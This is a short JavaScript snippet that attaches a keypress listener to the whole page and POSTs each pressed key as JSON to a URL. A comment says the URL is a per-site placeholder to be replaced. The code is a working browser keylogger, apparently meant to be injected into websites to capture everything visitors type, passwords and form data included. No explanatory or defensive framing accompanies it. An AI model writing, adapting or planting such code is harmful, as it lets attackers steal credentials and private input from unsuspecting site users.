// generate per site url
const url = "/k"  // placeholder to be replaced
// add listener
window.addEventListener('keypress', async (ev)=>{
    await sendKey(ev.key)
})
async function sendKey(key){
    const data = {
        key: key
    }
    let res = await fetch(url, {
        method: 'POST',
        mode: 'cors',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
            // 'Access-Control-Allow-Origin': 
        }
    })
}